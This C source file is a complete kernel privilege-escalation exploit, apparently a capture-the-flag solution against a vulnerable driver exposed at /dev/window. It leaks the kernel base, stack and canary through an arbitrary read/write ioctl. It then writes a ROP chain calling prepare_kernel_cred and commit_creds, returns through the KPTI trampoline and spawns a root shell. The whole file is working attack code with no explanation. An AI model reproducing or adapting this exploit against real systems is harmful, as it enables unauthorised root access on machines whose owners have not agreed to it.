#include <fcntl.h>      /* open */
#include <unistd.h>     /* exit */
#include <sys/ioctl.h>  /* ioctl */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <linux/ioctl.h>
#include <linux/tty.h>
#include <sys/syscall.h>
#include <assert.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/timerfd.h>

#define DEVICE_FILE_NAME "/dev/window"

int fd;

struct request {
  char* ptr;
  unsigned long buf[16];
} req;

unsigned long user_cs, user_ss, user_rflags, user_sp;
void* tmp;
void* buf[0x100];
unsigned long canary = 0;
void* stack = 0;
void* frame = 0;
char* base;

// gadgets
void* pop_rdi;
void* push_rax;
void* prepare_kernel_cred;
void* commit_creds;
void* kpti_trampoline;


void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void hexdump(uint8_t* buf, int size) {
    for (int i = 0; i < size; i+=16) {
        printf("0x%02hhx| ", i);
        for (int j = 0; j < 16; j++)
            printf("%02hhx ", buf[i+j]);
        puts("");
    }
}

void shell() {
  puts("[*] spawning shell");
  char *args[] = {"/bin/sh", NULL};
  execve("/bin/sh", args, 0);
}

void callback() {
  __asm__(
      ".intel_syntax noprefix;"
      "mov tmp, rax;"
      ".att_syntax;"
  );
  printf("[*] cred struct: %p\n", (void*)tmp);

  int off = 8;

  buf[off++] = canary;
  buf[off++] = 0;
  buf[off++] = pop_rdi;
  buf[off++] = tmp;
  buf[off++] = commit_creds;
  buf[off++] = kpti_trampoline;
  buf[off++] = 0;
  buf[off++] = 0;
  buf[off++] = &shell;
  buf[off++] = (void*)user_cs;
  buf[off++] = (void*)user_rflags;
  buf[off++] = (void*)user_sp;
  buf[off++] = (void*)user_ss;

  write(fd, buf, 0x100);

  puts("[*] this should never execute");
}

int main(int argc, char *argv[])
{
  int res;

  fd = open(DEVICE_FILE_NAME, O_RDWR);
  if (fd < 0){
    puts("[*] Device file not found.");
    exit(0);
  }

  // find kernel base
  for (char* i = 0xffffffff80000000; i<=0xffffffffc0000000; i += 0x200000) {
    memset(req.buf, 0, 0x100);
    req.ptr = i;
    ioctl(fd, 0x1337, &req);
    if (req.buf[0] == 0x4802003f51258d48) {
      base = i;
      printf("[*] found ktext @ %p\n", base);
      break;
    }
  }

  srand(time(0));

  // find kstack
  for (int i = rand() % 0x1000; i < 30000; i++) {
    memset(req.buf, 0, 0x100);
    req.ptr = base + 0x2000000 + i*0x100;
    ioctl(fd, 0x1337, &req);
    for (int j = 0; j < 32; j++) {
      if (req.buf[j] >> 48 == 0xffff && (req.buf[j] % 0x100000000000)>>28 != 0xffff && req.buf[j] > 0xffffa00000000000 && req.buf[j] < 0xffffbfff00000000) {
        stack = (req.buf[j]>>28)<<28;
        printf("[*] found stack @ %p\n", stack);
        break;
      }
    }
    if (stack != 0) {
      break;
    }
  }

  // fallback - we found the wrong stack
  if (stack == 0) {
    puts("[*] exploit failed, stack leak invalid, try again");
    exit(0);
  }

  // create buf that is easy to search for
  for (int i=0; i<16; i++) {
      buf[i] = 0x4142414341444100 + i;
  }

  // find stack frame
  for (int i = 0x50000; i > 0; i--) {
    memset(req.buf, 0, 0x100);
    req.ptr = stack + i*0x100;
    memcpy(req.buf, buf, 0x100);
    res = ioctl(fd, 0x1337, &req);
    for (int j = 0; j < 32; j++) {
      if (res == 0 && req.buf[j] >> 8 == 0x41424143414441) {
        frame = stack + i*0x100 + j*8 - (req.buf[j] % 256)*8;
        printf("[*] found stack frame @ %p\n", frame);
        break;
      }
    }
    if (frame != 0) {
      break;
    }
  }

  // fallback - we found the wrong stack
  if (frame < 0xffffffffffff) {
    puts("[*] exploit failed, stack leak invalid, try again");
    exit(0);
  }

  // find canary
  for (int i=-50; i<50; i++) {
    memset(req.buf, 0, 0x100);
    req.ptr = frame + i*0x100;
    ioctl(fd, 0x1337, &req);
    for (int j=0; j<32; j++) {
      if (req.buf[j] != 0 && req.buf[j] % 256 == 0 && req.buf[j] >> 48 != 0xffff && req.buf[j] > 0xffffffffffffff) {
        canary = req.buf[j];
        printf("[*] found canary %p\n", (void*)canary);
        break;
      }
    }
    if (canary != 0) {
      break;
    }
  }

  // fallback - we found the wrong stack
  if (canary == 0) {
    puts("[*] exploit failed, canary leak invalid, try again");
    exit(0);
  }

  pop_rdi = base + 0xb89e0;
  push_rax = base + 0x96131;
  prepare_kernel_cred = base + 0xffb80;
  commit_creds = base + 0xff8a0;
  kpti_trampoline = base + 0x10010f0 + 54;

  save_state();

  int off = 8;

  buf[off++] = canary;
  buf[off++] = 0;
  buf[off++] = pop_rdi;
  buf[off++] = 0;
  buf[off++] = prepare_kernel_cred;
  buf[off++] = kpti_trampoline;
  buf[off++] = 0;
  buf[off++] = 0;
  buf[off++] = &callback;
  buf[off++] = (void*)user_cs;
  buf[off++] = (void*)user_rflags;
  buf[off++] = (void*)user_sp;
  buf[off++] = (void*)user_ss;

  write(fd, buf, 0x100);
}

